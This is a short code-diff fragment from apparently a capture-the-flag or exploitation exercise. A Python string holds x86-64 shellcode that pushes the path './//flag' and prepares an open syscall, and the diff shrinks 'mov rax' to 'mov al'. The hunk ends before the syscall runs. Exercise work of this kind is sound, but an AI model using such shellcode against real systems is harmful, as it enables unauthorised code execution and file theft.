@@ -6,7 +6,7 @@ def check(s, i):
     sc_source = '''
 xor rax, rax
 push rax
-mov rax, 0x2
+mov al, 0x2
 mov r8, 0x67616c662f2f2f2e
 push r8
 mov rdi, rsp
